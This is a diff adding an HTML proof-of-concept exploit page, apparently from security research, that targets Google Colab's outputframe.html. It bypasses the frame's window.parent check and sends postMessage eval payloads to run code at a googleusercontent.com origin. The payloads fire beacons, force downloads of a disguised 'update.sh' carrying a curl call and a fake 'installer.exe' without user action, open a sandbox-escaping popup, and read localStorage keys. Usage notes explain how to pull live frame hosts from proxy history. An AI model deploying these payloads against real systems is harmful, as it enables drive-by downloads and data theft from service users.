@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<!--
+poc74 — postMessage eval bypass on outputframe.html
+
+WHAT THIS TESTS:
+  outputframe.html's only security check is:
+    if (message.source != window.parent) { return; }
+
+  When WE embed the frame, WE are window.parent. The check passes.
+  This page sends {sandboxed_iframe_evaluation: "...code..."} to the frame
+  and verifies that eval() runs at *.googleusercontent.com origin.
+
+HOW TO USE:
+  1. Get any valid outputframe.html URL from Caido history:
+     Search: req.host.cont:"googleusercontent.com" AND req.path.cont:"outputframe"
+     Copy the host, e.g.: mz1np8m7cn-496ff2e9c6d22116-0-colab.googleusercontent.com
+
+  2. Paste it into OUTPUTFRAME_HOST below (or update URL in the iframe src)
+
+  3. Serve this file locally:
+     python -m http.server 8888
+     Then open http://localhost:8888/poc74_postmessage_eval.html
+
+  4. Watch the results panel — it logs what executes in the frame
+
+  5. Check Chrome DevTools Network tab for download attempts
+
+WHAT TO WATCH FOR:
+  - "eval executed" message → the postMessage bypass works
+  - "origin: ..." → confirms execution is at googleusercontent.com
+  - Download bar appears → allow-downloads fires from eval without user gesture
+  - "popup opened" → allow-popups-to-escape-sandbox + blob: popup
+
+NOTE: Chrome may block downloads triggered from cross-origin iframes even with
+allow-downloads. If blocked, the test shows WHERE the block happens.
+-->
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>poc74 — postMessage eval test</title>
+  <style>
+    body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }
+    h2 { color: #569cd6; }
+    #log { background: #252526; border: 1px solid #3c3c3c; padding: 10px; height: 300px;
+           overflow-y: auto; font-size: 12px; white-space: pre-wrap; }
+    button { background: #0e639c; color: white; border: none; padding: 8px 16px;
+             margin: 4px; cursor: pointer; font-family: monospace; }
+    button:hover { background: #1177bb; }
+    iframe { border: 2px solid #569cd6; width: 100%; height: 100px; background: white; }
+    .warn { color: #f14c4c; }
+    .ok { color: #4ec9b0; }
+    .info { color: #dcdcaa; }
+  </style>
+</head>
+<body>
+<h2>poc74 — outputframe.html postMessage eval bypass</h2>
+
+<p>Embeds <code>outputframe.html</code> with attacker as <code>window.parent</code>.<br>
+The <code>message.source != window.parent</code> check passes — we own the frame.</p>
+
+<!-- CHANGE THIS to a real outputframe URL from Caido history -->
+<input id="frameUrl" type="text"
+  value="https://mz1np8m7cn-496ff2e9c6d22116-0-colab.googleusercontent.com/outputframe.html"
+  style="width:700px;background:#252526;color:#d4d4d4;border:1px solid #3c3c3c;padding:4px;font-family:monospace">
+<button onclick="loadFrame()">Load Frame</button>
+
+<br><br>
+<iframe id="targetFrame" src="about:blank" sandbox="allow-scripts allow-same-origin allow-downloads allow-popups allow-popups-to-escape-sandbox allow-forms allow-modals"></iframe>
+
+<br>
+<button onclick="testEval()">① Test eval executes</button>
+<button onclick="testOrigin()">② Log origin</button>
+<button onclick="testDownloadScript()">③ Download via a.click() (no gesture)</button>
+<button onclick="testDownloadSh()">④ Download .sh file</button>
+<button onclick="testDownloadExe()">⑤ Download .exe file</button>
+<button onclick="testPopupEscape()">⑥ window.open(blob) popup escape</button>
+<button onclick="testGetStorage()">⑦ Read localStorage (googleusercontent.com)</button>
+
+<br><br>
+<div id="log">Waiting...\n</div>
+
+<script>
+const log = document.getElementById('log');
+const frame = document.getElementById('targetFrame');
+const BEACON = 'https://colab.research.google.com/__poc74/PM';
+
+function addLog(msg, cls) {
+  const line = document.createElement('span');
+  line.className = cls || '';
+  line.textContent = new Date().toISOString().substr(11,8) + ' ' + msg + '\n';
+  log.appendChild(line);
+  log.scrollTop = log.scrollHeight;
+}
+
+// Listen for messages FROM the frame (to see if frame sends anything back)
+window.addEventListener('message', function(e) {
+  addLog('MSG FROM FRAME: ' + JSON.stringify(e.data), 'info');
+});
+
+function loadFrame() {
+  const url = document.getElementById('frameUrl').value.trim();
+  addLog('Loading frame: ' + url, 'info');
+  frame.src = url;
+  frame.onload = function() {
+    addLog('Frame loaded. window.parent === attacker page. Eval bypass ready.', 'ok');
+  };
+}
+
+function sendEval(code) {
+  if (!frame.contentWindow) { addLog('Frame not loaded', 'warn'); return; }
+  frame.contentWindow.postMessage({sandboxed_iframe_evaluation: code}, '*');
+  addLog('Sent eval: ' + code.substring(0, 80) + (code.length > 80 ? '...' : ''), 'info');
+}
+
+// ① Confirm eval fires at all
+function testEval() {
+  sendEval(
+    'window.parent.postMessage({poc74:"eval_confirmed", origin: location.origin}, "*");'
+    + `new Image().src="${BEACON}_EVAL_CONFIRMED";`
+  );
+  addLog('Watch for "eval_confirmed" message from frame...', 'info');
+}
+
+// ② Log origin inside the frame
+function testOrigin() {
+  sendEval(
+    'window.parent.postMessage({poc74:"origin", value: location.origin + " | " + location.href}, "*");'
+  );
+}
+
+// ③ a.click() download — no user gesture, pure script
+function testDownloadScript() {
+  sendEval(
+    'try {'
+    + 'var a=document.createElement("a");'
+    + 'a.href="data:text/plain;charset=utf-8,T6_POSTMSG_EVAL_NO_GESTURE";'
+    + 'a.download="poc74_eval_download.txt";'
+    + 'document.body.appendChild(a);'
+    + 'a.click();'
+    + 'document.body.removeChild(a);'
+    + `window.parent.postMessage({poc74:"click_attempted"},"*");`
+    + `new Image().src="${BEACON}_CLICK_ATTEMPTED";`
+    + '} catch(e){'
+    + `window.parent.postMessage({poc74:"click_error",err:e.message},"*");}`
+  );
+}
+
+// ④ Download .sh (shell script)
+function testDownloadSh() {
+  const content = '#!/bin/bash\necho "poc74_postmsg_eval_sh_confirmed"\ncurl ' + BEACON + '_SH_EXEC\n';
+  const b64 = btoa(content);
+  sendEval(
+    'var a=document.createElement("a");'
+    + `a.href="data:application/octet-stream;base64,${b64}";`
+    + 'a.download="update.sh";'
+    + 'document.body.appendChild(a);'
+    + 'a.click();'
+    + 'document.body.removeChild(a);'
+    + `window.parent.postMessage({poc74:"sh_click_attempted"},"*");`
+  );
+}
+
+// ⑤ Download .exe
+function testDownloadExe() {
+  const b64 = btoa('MZ_FAKE_T5_POSTMSG_EVAL_EXE');
+  sendEval(
+    'var a=document.createElement("a");'
+    + `a.href="data:application/octet-stream;base64,${b64}";`
+    + 'a.download="installer.exe";'
+    + 'document.body.appendChild(a);'
+    + 'a.click();'
+    + 'document.body.removeChild(a);'
+    + `window.parent.postMessage({poc74:"exe_click_attempted"},"*");`
+  );
+}
+
+// ⑥ window.open(blob) — popup escape from sandbox
+function testPopupEscape() {
+  sendEval(
+    'try {'
+    + 'var b=new Blob(["<h1>Escaped sandbox at "+location.origin+"</h1>"],{type:"text/html"});'
+    + 'var u=URL.createObjectURL(b);'
+    + 'var w=window.open(u,"_blank");'
+    + `window.parent.postMessage({poc74:"popup",opened:!!w,origin:location.origin},"*");`
+    + `new Image().src="${BEACON}_POPUP_"+(w?"OPENED":"BLOCKED");`
+    + '} catch(e){'
+    + `window.parent.postMessage({poc74:"popup_error",err:e.message},"*");}`
+  );
+}
+
+// ⑦ Read localStorage at googleusercontent.com
+function testGetStorage() {
+  sendEval(
+    'try {'
+    + 'var keys=Object.keys(localStorage);'
+    + `window.parent.postMessage({poc74:"localstorage",count:keys.length,keys:keys.slice(0,10)},"*");`
+    + '} catch(e){'
+    + `window.parent.postMessage({poc74:"ls_error",err:e.message},"*");}`
+  );
+}
+
+// Auto-receive messages and display them
+window.addEventListener('message', function(e) {
+  if (e.data && e.data.poc74) {
+    addLog('FRAME SAYS: ' + JSON.stringify(e.data), 'ok');
+  }
+}, true);
+
+addLog('Page loaded. Paste an outputframe.html URL above and click "Load Frame".', 'info');
+addLog('URL pattern: https://RAND-496ff2e9c6d22116-0-colab.googleusercontent.com/outputframe.html', 'info');
+addLog('Get RAND from Caido: search req.host.cont:"496ff2e9c6d22116"', 'info');
+</script>
+</body>
+</html>
